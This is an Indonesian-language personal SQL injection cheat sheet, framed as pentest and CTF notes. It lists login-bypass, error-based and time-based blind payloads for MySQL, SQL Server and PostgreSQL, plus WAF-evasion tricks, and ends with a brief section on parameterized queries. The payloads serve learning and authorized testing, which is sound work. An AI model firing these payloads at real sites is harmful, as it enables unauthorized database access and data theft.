# 💉 SQL Injection (SQLi) Cheat Sheet — 2026 Edition

> "Dari tahun 1998 sampe 2026, SQL Injection masih jadi jalan tolnya para hacker pemula buat masuk ke database."

Dokumentasi pribadi yang tak kumpulin dari hasil *bug hunting*, CTF, dan eksplorasi dunia *cyber security* selama 2025-2026. Bukan buat iseng ngerusak, tapi buat nge-test sistem yang emang udah dikasih izin (*penetration testing legal*) dan buat *reminder* diri sendiri/ lu semua inget kalo *developer* tuh sering banget lupa sanitasi.

---

## 🧠 SQL Injection — Definisi Ulang di 2026

Dulu gw kira SQL Injection tuh cuma sekedar `admin' or '1'='1` buat *bypass* login. Ternyata pas dipelajari ada banyak jenis SQL Injection, seperti:

* **Error-Based SQLi (Klasik):** Masih yang paling umum, karena tinggal liat *response error* dari database.
* **Blind/Time SQLi:** Gak ada error nongol, tapi kita bisa bedain respon "true" vs "false" dari *delay* atau perubahan konten.


**Intinya:** Selama ada query yang nempel dari input user tanpa *parameterized query*, SQLi bakal selalu ada.

---

## ⚠️ Dampak Nyata SQL Injection (Bukan Cuma Teori)

Gw kasih gambaran konsekuensi yang udah terjadi di dunia nyata, biar makin paham kenapa kerentanan ini masuk kategori *high/critical risk*:

| Dampak | Contoh Kasus Nyata |
| :--- | :--- |
| **Bypass Autentikasi** | Masuk dashboard admin tanpa password cuma modal `' OR 1=1 --` (klasik). |
| **Data Breach Massal** | Database bocor dan di-dump biasanya berawal dari celah SQLi. |
| **Data Manipulation** | Nge-update saldo, ngapus log aktivitas, atau ngubah status pesanan. |
| **RCE (Remote Code Execution)** | Di kasus tertentu (misal SQL Server dengan `xp_cmdshell`), *attacker* bisa eksekusi perintah OS langsung. |

---

## 🔍 Teknik SQL Injection

berikut beberapa contoh payload-payload yang paling *umum" berdasarkan pengalaman *pentest* .

### 1. Klasik Abadi — Login Bypass (Tanpa Password)
Ini yang paling sering dicoba duluan, soalnya kalo berhasil, lo udah dapet akses admin cuma dalam 5 detik.

```sql
Input: ' OR '1'='1' -- -
Query: SELECT * FROM users WHERE username = '' OR '1'='1' -- - AND password = ''

-- Penjelasan:
-- Kondisi '1'='1' SELALU TRUE, jadi query balikin semua baris.
-- Tanda -- (double dash) di SQL itu artinya komen, jadi sisa query (password) diabaikan.

Tips: Sekarang banyak WAF (Web Application Firewall) yang udah pinter nge-detect OR 1=1. Makanya coba pake encoding atau case manipulation:

```sql
' OR 1=1 --  →  %27%20OR%201%3D1%20--%20
' Or 1=1 --  →  Huruf 'O' besar kecil biar luput dari regex WAF
```
---

### 2. Error-Based SQLi (eror sql)
Ini easy banget soalnya diweb biasa muncul sql eror syntax lengkap + query sql, dari situ bisa tau struktur tabel, bahkan sampe nama kolom.

```SQL
' AND 1=CONVERT(int, @@version) --  (Buat SQL Server)
' AND extractvalue(1, concat(0x7e, database())) --  (Buat MySQL)
' AND updatexml(1, concat(0x7e, version()), 1) -- 
Output yang diharapkan: Error nampilin nama database, versi, atau path folder. Dari situ lu udah bisa petakan infrastruktur mereka.

```

### 3.Blind SQLi & Time Sqli
Ini lebih challenging soalnya gak ada error yang keluar. Lo harus bedain respon "halaman normal" vs "halaman kosong" atau "delay waktu".

```Time-Based Blind (Pake Delay):

SQL
' AND SLEEP(5) --  (MySQL)
' WAITFOR DELAY '0:0:5' --  (SQL Server)
' AND pg_sleep(5) --  (PostgreSQL)
Kalo halaman loading 5 detik, berarti query lo dieksekusi. Itu artinya SQLi-nya ada.

SQL
'--
'--+-
'--+
kalau petik ' blank, tinggal nambahin komen --+ buat cek apakah web kembali tampil normal, kalau iya berarti fix blind sqli

```
### 🔐 Cara Aman

Buat dev yang ngerjain projek ngoding, jangan cuma ngandelin WAF doang. Ini 1 pilar utama yang wajib ada:

```
Parameterized Query / Prepared Statements (Wajib!)
Ini yang paling ampuh, jadi query dan data dipisah secara logic.

# Contoh Python (Pake parameterized query)
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (user, pass))

Least Privilege Principle
User database jangan dikasih akses admin/root, cukup read/write sesuai kebutuhan fitur aja.
```

### 🌐 Sumber Belajar & Referensi

1.PortSwigger Web Security Academy — Lab SQLi gratis, komplit banget (minus harus jago bahasa Inggris).

2.PayloadsAllTheThings (GitHub) — Kumpulan payload dari berbagai macam injeksi.

3.OWASP SQL Injection Prevention Cheat Sheet — Standar industri buat pertahanan web.

### ✍️ Pesan & Catatan

Di 2026, SQL Injection tetep jadi masalah utama di dunia web. Kenapa? Karena banyak web app dari startup, web pemerintah, sekolah-sekolah, atau institusi pendidikan yang dibangun dari tahun 2000-an (kode warisan) di mana mereka takut ngelakuin perubahan kode ke yang lebih aman cuma karena takut error. Padahal SQLi ini masalah yang bener-bener real.

Jadi buat gw/kalian yang mau jadi security researcher: Jangan pernah berhenti belajar SQLi. Tekniknya emang udah tua, tapi sampe sekarang masih banyak yang kena. Buktinya, hampir tiap bulan ada aja berita bocor data gara-gara query yang gak di-prepare.

Disclaimer: "Dokumentasi ini cuma buat pembelajaran dan pengujian sistem yang sudah punya izin tertulis. Penyalahgunaan di luar ranah etis adalah tanggung jawab masing-masing."
